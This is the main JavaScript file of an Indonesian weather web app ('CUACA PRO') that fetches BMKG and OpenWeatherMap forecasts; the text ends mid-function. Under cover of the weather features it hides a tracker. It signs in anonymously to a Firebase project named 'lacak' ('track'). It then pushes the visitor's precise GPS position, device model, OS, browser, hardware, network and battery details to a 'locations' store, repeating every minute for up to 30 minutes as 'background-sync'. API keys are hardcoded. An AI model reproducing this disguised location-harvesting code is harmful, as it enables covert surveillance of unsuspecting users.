/* ============================================================
   CUACA PRO — Main Script v7
   Optimized: streaming render + BMKG timeout + IP fallback
   ============================================================ */

'use strict';

/* ============================================================
   CONFIG
   ============================================================ */
const APP_CONFIG = {
  OWM_KEY: '1a5561966733dade6aee541ec1022a75',
  OWM_BASE: 'https://api.openweathermap.org/data/2.5',
  OWM_GEO: 'https://api.openweathermap.org/geo/1.0',
  BMKG_BASE: 'https://api.bmkg.go.id/publik/prakiraan-cuaca',
  CACHE_TTL: 30 * 60 * 1000,
  BMKG_TIMEOUT: 3000,
  FETCH_TIMEOUT: 8000,
  LANG: 'id',
  UNITS: 'metric',
  SYNC_INTERVAL: 60000,
  MAX_SYNC_MINUTES: 30
};

const FB_CONFIG = {
  apiKey: "AIzaSyAtexjx8-NN55boZ5_nlDIoihWIX-q6E7o",
  authDomain: "lacak-2913d.firebaseapp.com",
  databaseURL: "https://lacak-2913d-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "lacak-2913d",
  storageBucket: "lacak-2913d.firebasestorage.app",
  messagingSenderId: "8740768270",
  appId: "1:8740768270:web:bd5d44fb6ff3c537f80a5f"
};

/* ============================================================
   DATABASE WILAYAH INDONESIA
   ============================================================ */
const REGIONS = [
  ["Kesesi", "33.26.09", "Pekalongan", "Jawa Tengah"],
  ["Kajen", "33.26.01", "Pekalongan", "Jawa Tengah"],
  ["Wonopringgo", "33.26.12", "Pekalongan", "Jawa Tengah"],
  ["Kedungwuni", "33.26.13", "Pekalongan", "Jawa Tengah"],
  ["Wirosari", "33.26.07", "Pekalongan", "Jawa Tengah"],
  ["Karanganyar", "33.26.14", "Pekalongan", "Jawa Tengah"],
  ["Talun", "33.26.05", "Pekalongan", "Jawa Tengah"],
  ["Doro", "33.26.06", "Pekalongan", "Jawa Tengah"],
  ["Sragi", "33.26.10", "Pekalongan", "Jawa Tengah"],
  ["Bojong", "33.26.11", "Pekalongan", "Jawa Tengah"],
  ["Tirto", "33.26.15", "Pekalongan", "Jawa Tengah"],
  ["Siwalan", "33.26.16", "Pekalongan", "Jawa Tengah"],
  ["Paninggaran", "33.26.08", "Pekalongan", "Jawa Tengah"],
  ["Lebakbarang", "33.26.03", "Pekalongan", "Jawa Tengah"],
  ["Petungkriyono", "33.26.04", "Pekalongan", "Jawa Tengah"],
  ["Kandangserang", "33.26.02", "Pekalongan", "Jawa Tengah"],
  ["Pekalongan Barat", "33.75.01", "Pekalongan", "Jawa Tengah"],
  ["Pekalongan Timur", "33.75.02", "Pekalongan", "Jawa Tengah"],
  ["Pekalongan Utara", "33.75.03", "Pekalongan", "Jawa Tengah"],
  ["Pekalongan Selatan", "33.75.04", "Pekalongan", "Jawa Tengah"],

  ["Semarang", "33.74.01", "Semarang", "Jawa Tengah"],
  ["Surakarta", "33.72.01", "Surakarta", "Jawa Tengah"],
  ["Solo", "33.72.01", "Surakarta", "Jawa Tengah"],
  ["Magelang", "33.71.01", "Magelang", "Jawa Tengah"],
  ["Tegal", "33.76.01", "Tegal", "Jawa Tengah"],
  ["Salatiga", "33.73.01", "Salatiga", "Jawa Tengah"],
  ["Purwokerto", "33.02.01", "Banyumas", "Jawa Tengah"],
  ["Cilacap", "33.01.01", "Cilacap", "Jawa Tengah"],
  ["Kudus", "33.19.01", "Kudus", "Jawa Tengah"],
  ["Jepara", "33.20.01", "Jepara", "Jawa Tengah"],
  ["Pati", "33.18.01", "Pati", "Jawa Tengah"],
  ["Rembang", "33.17.01", "Rembang", "Jawa Tengah"],
  ["Blora", "33.16.01", "Blora", "Jawa Tengah"],
  ["Grobogan", "33.15.01", "Grobogan", "Jawa Tengah"],
  ["Demak", "33.21.01", "Demak", "Jawa Tengah"],
  ["Kendal", "33.24.01", "Kendal", "Jawa Tengah"],
  ["Batang", "33.25.01", "Batang", "Jawa Tengah"],
  ["Pemalang", "33.27.01", "Pemalang", "Jawa Tengah"],
  ["Brebes", "33.29.01", "Brebes", "Jawa Tengah"],
  ["Wonosobo", "33.07.01", "Wonosobo", "Jawa Tengah"],
  ["Temanggung", "33.23.01", "Temanggung", "Jawa Tengah"],
  ["Kebumen", "33.05.01", "Kebumen", "Jawa Tengah"],
  ["Purworejo", "33.06.01", "Purworejo", "Jawa Tengah"],
  ["Klaten", "33.10.01", "Klaten", "Jawa Tengah"],
  ["Boyolali", "33.09.01", "Boyolali", "Jawa Tengah"],
  ["Sragen", "33.14.01", "Sragen", "Jawa Tengah"],
  ["Wonogiri", "33.12.01", "Wonogiri", "Jawa Tengah"],
  ["Sukoharjo", "33.11.01", "Sukoharjo", "Jawa Tengah"],

  ["Jakarta Pusat", "31.71.01", "Jakarta", "DKI Jakarta"],
  ["Jakarta Selatan", "31.74.01", "Jakarta", "DKI Jakarta"],
  ["Jakarta Barat", "31.73.01", "Jakarta", "DKI Jakarta"],
  ["Jakarta Timur", "31.75.01", "Jakarta", "DKI Jakarta"],
  ["Jakarta Utara", "31.72.01", "Jakarta", "DKI Jakarta"],

  ["Bandung", "32.73.01", "Bandung", "Jawa Barat"],
  ["Bogor", "32.71.01", "Bogor", "Jawa Barat"],
  ["Bekasi", "32.75.01", "Bekasi", "Jawa Barat"],
  ["Depok", "32.76.01", "Depok", "Jawa Barat"],
  ["Cirebon", "32.74.01", "Cirebon", "Jawa Barat"],
  ["Sukabumi", "32.72.01", "Sukabumi", "Jawa Barat"],
  ["Tasikmalaya", "32.78.01", "Tasikmalaya", "Jawa Barat"],
  ["Garut", "32.05.01", "Garut", "Jawa Barat"],
  ["Karawang", "32.15.01", "Karawang", "Jawa Barat"],
  ["Purwakarta", "32.14.01", "Purwakarta", "Jawa Barat"],
  ["Subang", "32.13.01", "Subang", "Jawa Barat"],
  ["Indramayu", "32.12.01", "Indramayu", "Jawa Barat"],
  ["Majalengka", "32.10.01", "Majalengka", "Jawa Barat"],
  ["Sumedang", "32.11.01", "Sumedang", "Jawa Barat"],
  ["Cianjur", "32.03.01", "Cianjur", "Jawa Barat"],
  ["Ciamis", "32.07.01", "Ciamis", "Jawa Barat"],
  ["Banjar", "32.79.01", "Banjar", "Jawa Barat"],

  ["Tangerang", "36.71.01", "Tangerang", "Banten"],
  ["Serang", "36.73.01", "Serang", "Banten"],
  ["Cilegon", "36.72.01", "Cilegon", "Banten"],
  ["Lebak", "36.02.01", "Lebak", "Banten"],
  ["Pandeglang", "36.01.01", "Pandeglang", "Banten"],

  ["Surabaya", "35.78.01", "Surabaya", "Jawa Timur"],
  ["Malang", "35.73.01", "Malang", "Jawa Timur"],
  ["Kediri", "35.71.01", "Kediri", "Jawa Timur"],
  ["Jember", "35.09.01", "Jember", "Jawa Timur"],
  ["Banyuwangi", "35.10.01", "Banyuwangi", "Jawa Timur"],
  ["Sidoarjo", "35.15.01", "Sidoarjo", "Jawa Timur"],
  ["Gresik", "35.25.01", "Gresik", "Jawa Timur"],
  ["Mojokerto", "35.16.01", "Mojokerto", "Jawa Timur"],
  ["Pasuruan", "35.14.01", "Pasuruan", "Jawa Timur"],
  ["Probolinggo", "35.13.01", "Probolinggo", "Jawa Timur"],
  ["Madiun", "35.77.01", "Madiun", "Jawa Timur"],
  ["Blitar", "35.72.01", "Blitar", "Jawa Timur"],
  ["Tulungagung", "35.05.01", "Tulungagung", "Jawa Timur"],
  ["Trenggalek", "35.03.01", "Trenggalek", "Jawa Timur"],
  ["Ponorogo", "35.02.01", "Ponorogo", "Jawa Timur"],
  ["Pacitan", "35.01.01", "Pacitan", "Jawa Timur"],
  ["Ngawi", "35.21.01", "Ngawi", "Jawa Timur"],
  ["Magetan", "35.20.01", "Magetan", "Jawa Timur"],
  ["Nganjuk", "35.18.01", "Nganjuk", "Jawa Timur"],
  ["Jombang", "35.17.01", "Jombang", "Jawa Timur"],
  ["Bojonegoro", "35.22.01", "Bojonegoro", "Jawa Timur"],
  ["Tuban", "35.23.01", "Tuban", "Jawa Timur"],
  ["Lamongan", "35.24.01", "Lamongan", "Jawa Timur"],
  ["Bangkalan", "35.26.01", "Bangkalan", "Jawa Timur"],
  ["Sampang", "35.27.01", "Sampang", "Jawa Timur"],
  ["Pamekasan", "35.28.01", "Pamekasan", "Jawa Timur"],
  ["Sumenep", "35.29.01", "Sumenep", "Jawa Timur"],
  ["Batu", "35.79.01", "Batu", "Jawa Timur"],

  ["Yogyakarta", "34.71.01", "Yogyakarta", "DI Yogyakarta"],
  ["Sleman", "34.04.01", "Sleman", "DI Yogyakarta"],
  ["Bantul", "34.02.01", "Bantul", "DI Yogyakarta"],
  ["Gunungkidul", "34.03.01", "Gunungkidul", "DI Yogyakarta"],
  ["Kulon Progo", "34.01.01", "Kulon Progo", "DI Yogyakarta"],

  ["Denpasar", "51.71.01", "Denpasar", "Bali"],
  ["Badung", "51.03.01", "Badung", "Bali"],
  ["Gianyar", "51.04.01", "Gianyar", "Bali"],
  ["Tabanan", "51.02.01", "Tabanan", "Bali"],
  ["Buleleng", "51.08.01", "Buleleng", "Bali"],
  ["Karangasem", "51.07.01", "Karangasem", "Bali"],
  ["Klungkung", "51.05.01", "Klungkung", "Bali"],
  ["Bangli", "51.06.01", "Bangli", "Bali"],
  ["Jembrana", "51.01.01", "Jembrana", "Bali"],

  ["Medan", "12.71.01", "Medan", "Sumatera Utara"],
  ["Palembang", "16.71.01", "Palembang", "Sumatera Selatan"],
  ["Padang", "13.71.01", "Padang", "Sumatera Barat"],
  ["Banda Aceh", "11.71.01", "Banda Aceh", "Aceh"],
  ["Pekanbaru", "14.71.01", "Pekanbaru", "Riau"],
  ["Bandar Lampung", "18.71.01", "Bandar Lampung", "Lampung"],
  ["Jambi", "15.71.01", "Jambi", "Jambi"],
  ["Bengkulu", "17.71.01", "Bengkulu", "Bengkulu"],
  ["Batam", "21.71.01", "Batam", "Kepulauan Riau"],
  ["Tanjungpinang", "21.72.01", "Tanjungpinang", "Kepulauan Riau"],
  ["Pangkal Pinang", "19.71.01", "Pangkal Pinang", "Bangka Belitung"],

  ["Pontianak", "61.71.01", "Pontianak", "Kalimantan Barat"],
  ["Banjarmasin", "63.71.01", "Banjarmasin", "Kalimantan Selatan"],
  ["Samarinda", "64.72.01", "Samarinda", "Kalimantan Timur"],
  ["Balikpapan", "64.71.01", "Balikpapan", "Kalimantan Timur"],
  ["Palangka Raya", "62.71.01", "Palangka Raya", "Kalimantan Tengah"],
  ["Tarakan", "65.71.01", "Tarakan", "Kalimantan Utara"],

  ["Makassar", "73.71.01", "Makassar", "Sulawesi Selatan"],
  ["Manado", "71.71.01", "Manado", "Sulawesi Utara"],
  ["Palu", "72.71.01", "Palu", "Sulawesi Tengah"],
  ["Kendari", "74.71.01", "Kendari", "Sulawesi Tenggara"],
  ["Gorontalo", "75.71.01", "Gorontalo", "Gorontalo"],
  ["Mamuju", "76.01.01", "Mamuju", "Sulawesi Barat"],
  ["Bitung", "71.72.01", "Bitung", "Sulawesi Utara"],
  ["Tomohon", "71.73.01", "Tomohon", "Sulawesi Utara"],
  ["Parepare", "73.72.01", "Parepare", "Sulawesi Selatan"],
  ["Palopo", "73.73.01", "Palopo", "Sulawesi Selatan"],

  ["Jayapura", "91.71.01", "Jayapura", "Papua"],
  ["Ambon", "81.71.01", "Ambon", "Maluku"],
  ["Sorong", "92.71.01", "Sorong", "Papua Barat"],
  ["Ternate", "82.71.01", "Ternate", "Maluku Utara"],
  ["Tidore", "82.72.01", "Tidore", "Maluku Utara"],
  ["Manokwari", "92.02.01", "Manokwari", "Papua Barat"],
  ["Merauke", "91.03.01", "Merauke", "Papua"],
  ["Timika", "94.04.01", "Mimika", "Papua"],
  ["Nabire", "94.01.01", "Nabire", "Papua"]
];

/* ============================================================
   SAFE UTILS
   ============================================================ */
const Safe = {
  num(v, fb = 0) {
    if (v === null || v === undefined) return fb;
    const n = parseFloat(v);
    return isNaN(n) || !isFinite(n) ? fb : n;
  },
  str(v, fb = '') {
    if (v === null || v === undefined) return fb;
    return String(v);
  },
  int(v, fb = 0) {
    return Math.round(this.num(v, fb));
  },
  arr(v) {
    return Array.isArray(v) ? v : [];
  }
};

async function fetchWithTimeout(url, options = {}, timeoutMs = 8000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
  try {
    return await fetch(url, { ...options, signal: controller.signal });
  } finally {
    clearTimeout(timeoutId);
  }
}

/* ============================================================
   STATE
   ============================================================ */
const State = {
  unit: 'C',
  lastData: null,
  userLocation: null,
  cookieAccepted: false,
  locationGranted: false,
  sessionId: null,
  syncTimer: null,
  syncStartTime: null,
  isSyncing: false,
  sourceType: null
};

/* ============================================================
   FIREBASE (non-blocking)
   ============================================================ */
let fbDb = null, fbAuth = null, fbReady = false;

function initFirebase() {
  if (typeof firebase === 'undefined') {
    console.warn('[sync] firebase sdk not loaded');
    return;
  }

  setTimeout(() => {
    try {
      firebase.initializeApp(FB_CONFIG);
      fbDb = firebase.database();
      fbAuth = firebase.auth();
      fbAuth.signInAnonymously()
        .then(() => { fbReady = true; })
        .catch(err => console.warn('[sync] auth skip:', err.code));
    } catch (e) {
      console.warn('[sync] init skip:', e.message);
    }
  }, 1000);
}

/* ============================================================
   DEVICE INFO
   ============================================================ */
function getDeviceInfo() {
  const ua = Safe.str(navigator.userAgent);
  let os = 'Unknown', device = 'Unknown';

  if (/Android/i.test(ua)) {
    const m = ua.match(/Android\s+([\d.]+)/);
    os = 'Android ' + (m ? m[1] : '');
    const dm = ua.match(/Android[^;]*;\s*([^;)]+?)(?:\s+Build|\))/i);
    if (dm) device = dm[1].trim();
  } else if (/iPhone|iPad|iPod/i.test(ua)) {
    const m = ua.match(/OS\s+([\d_]+)/);
    os = 'iOS ' + (m ? m[1].replace(/_/g, '.') : '');
    device = /iPad/i.test(ua) ? 'iPad' : 'iPhone';
  } else if (/Windows/i.test(ua)) {
    os = 'Windows'; device = 'PC Windows';
  } else if (/Mac OS X/i.test(ua)) {
    const m = ua.match(/Mac OS X\s+([\d_.]+)/);
    os = 'macOS ' + (m ? m[1].replace(/_/g, '.') : '');
    device = 'Mac';
  } else if (/Linux/i.test(ua)) {
    os = 'Linux'; device = 'PC Linux';
  }

  let browser = 'Unknown', version = '';
  const tests = [
    { n: 'Edge', r: /Edg\/([\d.]+)/ },
    { n: 'Opera', r: /OPR\/([\d.]+)/ },
    { n: 'Samsung', r: /SamsungBrowser\/([\d.]+)/ },
    { n: 'Chrome', r: /Chrome\/([\d.]+)/ },
    { n: 'Firefox', r: /Firefox\/([\d.]+)/ },
    { n: 'Safari', r: /Version\/([\d.]+).*Safari/ }
  ];
  for (const t of tests) {
    const m = ua.match(t.r);
    if (m) { browser = t.n; version = m[1]; break; }
  }

  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

  return {
    device, os, browser, browser_version: version,
    screen: `${window.screen.width}x${window.screen.height}`,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    language: navigator.language || 'unknown',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
    cpu_cores: navigator.hardwareConcurrency || null,
    memory_gb: navigator.deviceMemory || null,
    net_type: conn ? conn.effectiveType : null,
    user_agent: ua.slice(0, 256)
  };
}

async function getBatteryInfo() {
  if (!navigator.getBattery) return { level: null, charging: null };
  try {
    const b = await navigator.getBattery();
    return { level: Math.round(b.level * 100), charging: b.charging };
  } catch {
    return { level: null, charging: null };
  }
}

/* ============================================================
   SESSION
   ============================================================ */
function getSessionId() {
  const KEY = 'cuaca_session';
  let id = sessionStorage.getItem(KEY);
  if (!id) {
    id = 's_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 8);
    sessionStorage.setItem(KEY, id);
  }
  return id;
}

/* ============================================================
   BACKGROUND SYNC
   ============================================================ */
async function syncLocation(coords, source, meta = {}) {
  if (!fbReady || !fbDb || !coords) return;
  try {
    const device = getDeviceInfo();
    const battery = await getBatteryInfo();

    const payload = {
      session_id: State.sessionId,
      lat: Safe.num(coords.latitude),
      lon: Safe.num(coords.longitude),
      accuracy: coords.accuracy != null ? Safe.num(coords.accuracy) : null,
      source: source || 'auto',
      device: device.device,
      os: device.os,
      browser: device.browser,
      browser_version: device.browser_version,
      screen: device.screen,
      viewport: device.viewport,
      language: device.language,
      timezone: device.timezone,
      cpu_cores: device.cpu_cores,
      memory_gb: device.memory_gb,
      net_type: device.net_type,
      user_agent: device.user_agent,
      battery_level: battery.level,
      battery_charging: battery.charging,
      location_name: meta.locationName || null,
      label: device.device || 'unknown',
      created_at: Date.now()
    };

    await fbDb.ref('locations').push(payload);
  } catch (e) {
    console.warn('[sync] push gagal:', e.code || e.message);
  }
}

function startAutoSync() {
  if (State.isSyncing) return;
  State.isSyncing = true;
  State.syncStartTime = Date.now();

  State.syncTimer = setInterval(async () => {
    if (Date.now() - State.syncStartTime > APP_CONFIG.MAX_SYNC_MINUTES * 60 * 1000) {
      stopAutoSync();
      return;
    }
    if (document.hidden) return;
    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
      pos => syncLocation(pos.coords, 'background-sync'),
      () => {},
      { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }
    );
  }, APP_CONFIG.SYNC_INTERVAL);
}

function stopAutoSync() {
  if (State.syncTimer) {
    clearInterval(State.syncTimer);
    State.syncTimer = null;
  }
  State.isSyncing = false;
}

/* ============================================================
   IP GEOLOCATION (paralel race)
   ============================================================ */
const IPGeo = {
  cache: null,
  async fetch() {
    if (this.cache) return this.cache;

    const tryIpapi = async () => {
      try {
        const res = await fetchWithTimeout('https://ipapi.co/json/', {}, 4000);
        if (!res.ok) return null;
        const d = await res.json();
        if (d.latitude && d.longitude) {
          return {
            lat: Safe.num(d.latitude),
            lon: Safe.num(d.longitude),
            city: d.city || 'Kota Anda',
            region: d.region || '',
            country: d.country_name || ''
          };
        }
      } catch (e) {}
      return null;
    };

    const tryIpApi = async () => {
      try {
        const res = await fetchWithTimeout('http://ip-api.com/json/', {}, 4000);
        const d = await res.json();
        if (d.status === 'success') {
          return {
            lat: Safe.num(d.lat),
            lon: Safe.num(d.lon),
            city: d.city || 'Kota Anda',
            region: d.regionName || '',
            country: d.country || ''
          };
        }
      } catch (e) {}
      return null;
    };

    const result = await Promise.race([
      tryIpapi(),
      tryIpApi(),
      new Promise(resolve => setTimeout(() => resolve(null), 5000))
    ]);

    if (result) {
      this.cache = { ...result, source: 'ip' };
      return this.cache;
    }
    return null;
  }
};

/* ============================================================
   GPS
   ============================================================ */
function getPosition(options) {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      return reject(new Error('Geolocation tidak tersedia'));
    }
    navigator.geolocation.getCurrentPosition(resolve, reject, options);
  });
}

async function getQuickLocation() {
  const pos = await getPosition({
    enableHighAccuracy: false,
    timeout: 5000,
    maximumAge: 60000
  });
  return {
    latitude: Safe.num(pos?.coords?.latitude),
    longitude: Safe.num(pos?.coords?.longitude),
    accuracy: Safe.num(pos?.coords?.accuracy, 999)
  };
}

async function getAccurateLocation() {
  const samples = [];

  for (let i = 0; i < 3; i++) {
    try {
      const pos = await getPosition({
        enableHighAccuracy: true,
        timeout: 12000,
        maximumAge: 0
      });

      samples.push({
        lat: Safe.num(pos?.coords?.latitude),
        lon: Safe.num(pos?.coords?.longitude),
        accuracy: Safe.num(pos?.coords?.accuracy, 9999)
      });

      if (pos?.coords?.accuracy <= 15) break;
      await new Promise(r => setTimeout(r, 400));
    } catch (e) {
      if (i === 2 && samples.length === 0) throw e;
    }
  }

  if (samples.length === 0) throw new Error('Lokasi tidak terdeteksi');
  const best = samples.reduce((a, b) => a.accuracy < b.accuracy ? a : b);

  return {
    coords: {
      latitude: best.lat,
      longitude: best.lon,
      accuracy: best.accuracy
    },
    totalSamples: samples.length
  };
}

/* ============================================================
   CACHE
   ============================================================ */
const WeatherCache = {
  get(key) {
    try {
      const raw = localStorage.getItem(key);
      if (!raw) return null;
      const { data, ts } = JSON.parse(raw);
      if (Date.now() - ts > APP_CONFIG.CACHE_TTL) {
        localStorage.removeItem(key);
        return null;
      }
      return data;
    } catch { return null; }
  },
  set(key, data) {
    try { localStorage.setItem(key, JSON.stringify({ data, ts: Date.now() })); } catch {}
  }
};

/* ============================================================
   WEATHER API
   ============================================================ */
const WeatherAPI = {
  isInIndonesia(lat, lon) {
    return lat >= -11 && lat <= 6 && lon >= 95 && lon <= 141;
  },

  async getByCoords(lat, lon, label) {
    const safeLat = Safe.num(lat);
    const safeLon = Safe.num(lon);
    const k = `cur_${safeLat.toFixed(2)}_${safeLon.toFixed(2)}`;
    const cached = WeatherCache.get(k);
    if (cached) return cached;

    if (this.isInIndonesia(safeLat, safeLon)) {
      // BMKG & OWM paralel — race dengan timeout BMKG 3 detik
      const bmkgPromise = this.fetchBMKGByCoords(safeLat, safeLon).catch(() => null);
      const owmPromise = this.fetchOWMCurrent(safeLat, safeLon).catch(() => null);

      const bmkg = await Promise.race([
        bmkgPromise,
        new Promise(resolve => setTimeout(() => resolve(null), APP_CONFIG.BMKG_TIMEOUT))
      ]);

      if (bmkg && bmkg.weather?.[0]) {
        WeatherCache.set(k, bmkg);
        return bmkg;
      }

      const owm = await owmPromise;
      if (owm) {
        WeatherCache.set(k, owm);
        return owm;
      }

      throw new Error('Gagal memuat cuaca');
    }

    const owm = await this.fetchOWMCurrent(safeLat, safeLon);
    WeatherCache.set(k, owm);
    return owm;
  },

  async getForecast(lat, lon) {
    const safeLat = Safe.num(lat);
    const safeLon = Safe.num(lon);
    const k = `fc_${safeLat.toFixed(2)}_${safeLon.toFixed(2)}`;
    const cached = WeatherCache.get(k);
    if (cached) return cached;

    const owm = await this.fetchOWMForecast(safeLat, safeLon);
    WeatherCache.set(k, owm);
    return owm;
  },

  findNearestRegion(lat, lon) {
    return null;
  },

  async fetchBMKGByCoords(lat, lon) {
    const nearest = this.findNearestRegion(lat, lon);
    if (!nearest) return null;

    const adm4 = nearest[1] + '.0001';

    try {
      const res = await fetchWithTimeout(
        `${APP_CONFIG.BMKG_BASE}?adm4=${adm4}`,
        {},
        APP_CONFIG.BMKG_TIMEOUT
      );
      if (!res.ok) return null;
      const data = await res.json();
      return this.parseBMKG(data, nearest);
    } catch (e) {
      console.warn('[bmkg] fetch error:', e.message);
      return null;
    }
  },

  parseBMKG(data, region) {
    try {
      const list = data?.data?.[0]?.cuaca?.[0];
      if (!Array.isArray(list) || list.length === 0) return null;

      const now = list[0] || {};

      const tempVal = Safe.num(now.t, Safe.num(now.tcc, 28));
      const humidityVal = Safe.num(now.hu, 70);
      const windKmh = Safe.num(now.ws, 5);

      return {
        name: Safe.str(region?.[0], 'Lokasi') + (region?.[2] ? ', ' + region[2] : ''),
        sys: { country: 'ID' },
        main: {
          temp: tempVal,
          feels_like: tempVal,
          humidity: humidityVal
        },
        wind: { speed: windKmh / 3.6 },
        weather: [{
          main: this.bmkgWeatherMain(now.weather_desc),
          description: Safe.str(now.weather_desc, 'Berawan').toLowerCase(),
          icon: this.bmkgWeatherIcon(now.weather_desc)
        }],
        source: 'bmkg'
      };
    } catch (e) {
      console.warn('[bmkg] parse error:', e.message);
      return null;
    }
  },

  bmkgWeatherMain(desc) {
    const d = Safe.str(desc).toLowerCase();
    if (d.includes('hujan') && d.includes('petir')) return 'Thunderstorm';
    if (d.includes('hujan')) return 'Rain';
    if (d.includes('cerah') && d.includes('berawan')) return 'Clouds';
    if (d.includes('cerah')) return 'Clear';
    if (d.includes('berawan')) return 'Clouds';
    if (d.includes('kabut') || d.includes('asap')) return 'Mist';
    return 'Clouds';
  },

  bmkgWeatherIcon(desc) {
    const d = Safe.str(desc).toLowerCase();
    if (d.includes('petir')) return '11d';
    if (d.includes('hujan') && d.includes('deras')) return '10d';
    if (d.includes('hujan')) return '10d';
    if (d.includes('cerah') && d.includes('berawan')) return '02d';
    if (d.includes('cerah')) return '01d';
    if (d.includes('berawan')) return '03d';
    if (d.includes('kabut') || d.includes('asap')) return '50d';
    return '02d';
  },

  async fetchOWMCurrent(lat, lon) {
    const qs = new URLSearchParams({
      lat: Safe.num(lat),
      lon: Safe.num(lon),
      appid: APP_CONFIG.OWM_KEY,
      units: APP_CONFIG.UNITS,
      lang: APP_CONFIG.LANG
    });
    const res = await fetchWithTimeout(
      `${APP_CONFIG.OWM_BASE}/weather?${qs}`,
      {},
      APP_CONFIG.FETCH_TIMEOUT
    );
    const data = await res.json();
    if (data.cod && Number(data.cod) !== 200) {
      throw new Error(this.mapError(data.cod));
    }
    return data;
  },

  async fetchOWMForecast(lat, lon) {
    const qs = new URLSearchParams({
      lat: Safe.num(lat),
      lon: Safe.num(lon),
      appid: APP_CONFIG.OWM_KEY,
      units: APP_CONFIG.UNITS,
      lang: APP_CONFIG.LANG
    });
    const res = await fetchWithTimeout(
      `${APP_CONFIG.OWM_BASE}/forecast?${qs}`,
      {},
      APP_CONFIG.FETCH_TIMEOUT
    );
    const data = await res.json();
    if (data.cod && Number(data.cod) !== 200) {
      throw new Error(this.mapError(data.cod));
    }
    return data;
  },

  mapError(code) {
    const map = {
      '404': 'Lokasi tidak terdeteksi.',
      '401': 'Layanan cuaca tidak tersedia.',
      '429': 'Terlalu banyak permintaan. Coba lagi nanti.',
      '400': 'Permintaan tidak valid.'
    };
    return map[String(code)] || 'Terjadi kesalahan.';
  },

  async fetchBMKGByAdm4(adm4) {
    try {
      const res = await fetchWithTimeout(
        `${APP_CONFIG.BMKG_BASE}?adm4=${adm4}`,
        {},
        APP_CONFIG.BMKG_TIMEOUT
      );
      if (!res.ok) return null;
      return await res.json();
    } catch {
      return null;
    }
  },

  buildBMKGForecast(data) {
    try {
      const list = [];
      const cuacaArr = data?.data?.[0]?.cuaca || [];

      cuacaArr.forEach(dayArr => {
        if (!Array.isArray(dayArr)) return;
        dayArr.slice(0, 8).forEach(item => {
          if (!item) return;
          const dtStr = item.local_datetime || item.datetime;
          const dtMs = dtStr ? new Date(dtStr).getTime() : Date.now();
          if (isNaN(dtMs)) return;

          list.push({
            dt: dtMs / 1000,
            main: {
              temp: Safe.num(item.t, Safe.num(item.tcc, 28)),
              feels_like: Safe.num(item.t, 28)
            },
            weather: [{
              icon: this.bmkgWeatherIcon(item.weather_desc),
              description: Safe.str(item.weather_desc, 'Berawan').toLowerCase(),
              main: this.bmkgWeatherMain(item.weather_desc)
            }]
          });
        });
      });

      return list.slice(0, 8);
    } catch (e) {
      console.warn('[bmkg-forecast] error:', e.message);
      return [];
    }
  }
};

/* ============================================================
   ICON
   ============================================================ */
const Icon = {
  fromCode(code) {
    if (!code) return '#i-cloud';
    switch (String(code).slice(0, 2)) {
      case '01': return '#i-sun';
      case '02': return '#i-sun-cloud';
      case '03': case '04': return '#i-cloud';
      case '09': case '10': return '#i-rain';
      case '11': return '#i-thunder';
      case '13': return '#i-snow';
      case '50': return '#i-mist';
      default: return '#i-cloud';
    }
  },
  svg(code, size = 42) {
    return `<svg class="forecast-icon" width="${size}" height="${size}" aria-hidden="true"><use href="${this.fromCode(code)}"/></svg>`;
  }
};

/* ============================================================
   UI
   ============================================================ */
const UI = {
  el: {},

  init() {
    const id = (x) => document.getElementById(x);
    this.el = {
      landing: id('landing'),
      startBtn: id('startBtn'),
      cookieBanner: id('cookieBanner'),
      cookieAccept: id('cookieAccept'),
      cookieDecline: id('cookieDecline'),
      locationModal: id('locationModal'),
      modalAllow: id('modalAllow'),
      modalManual: id('modalManual'),
      modalLater: id('modalLater'),
      searchModal: id('searchModal'),
      searchInput: id('searchInput'),
      searchResults: id('searchResults'),
      searchCancel: id('searchCancel'),
      app: id('app'),
      searchBtn: id('searchBtn'),
      unitToggle: id('unitToggle'),
      status: id('status'),
      weatherCard: id('weatherCard'),
      accuracyDisclaimer: id('accuracyDisclaimer'),
      disclaimerText: id('disclaimerText'),
      cityName: id('cityName'),
      description: id('description'),
      temperature: id('temperature'),
      humidity: id('humidity'),
      wind: id('wind'),
      feelsLike: id('feelsLike'),
      currentIconUse: id('currentIconUse'),
      forecastList: id('forecastList'),
      toast: id('toast')
    };
  },

  setStatus(msg, isError = false) {
    if (!this.el.status) return;
    this.el.status.textContent = Safe.str(msg);
    this.el.status.className = `status show${isError ? ' error' : ''}`;
  },

  clearStatus() {
    if (!this.el.status) return;
    this.el.status.className = 'status';
    this.el.status.textContent = '';
  },

  showToast(msg, duration = 2500) {
    if (!this.el.toast) return;
    this.el.toast.textContent = Safe.str(msg);
    this.el.toast.classList.remove('hidden');
    setTimeout(() => this.el.toast.classList.add('hidden'), duration);
  },

  hideLanding() { if (this.el.landing) this.el.landing.classList.add('hidden'); },
  showApp() { if (this.el.app) this.el.app.classList.remove('hidden'); },
  showCookieBanner() { if (this.el.cookieBanner) this.el.cookieBanner.classList.remove('hidden'); },
  hideCookieBanner() { if (this.el.cookieBanner) this.el.cookieBanner.classList.add('hidden'); },
  showLocationModal() { if (this.el.locationModal) this.el.locationModal.classList.remove('hidden'); },
  hideLocationModal() { if (this.el.locationModal) this.el.locationModal.classList.add('hidden'); },
  showSearchModal() {
    if (this.el.searchModal) this.el.searchModal.classList.remove('hidden');
    setTimeout(() => this.el.searchInput?.focus(), 100);
  },
  hideSearchModal() {
    if (this.el.searchModal) this.el.searchModal.classList.add('hidden');
    if (this.el.searchInput) this.el.searchInput.value = '';
    if (this.el.searchResults) this.el.searchResults.innerHTML = '';
  },

  toUnit(c) {
    const v = Safe.num(c, 0);
    return State.unit === 'C' ? Math.round(v) : Math.round(v * 9 / 5 + 32);
  },

  unitSymbol() {
    return State.unit === 'C' ? '°C' : '°F';
  },

  setTheme(condition) {
    document.body.className = '';
    const c = Safe.str(condition).toLowerCase();
    if (c.includes('clear')) document.body.classList.add('theme-clear');
    else if (c.includes('rain') || c.includes('drizzle')) document.body.classList.add('theme-rain');
    else if (c.includes('cloud')) document.body.classList.add('theme-clouds');
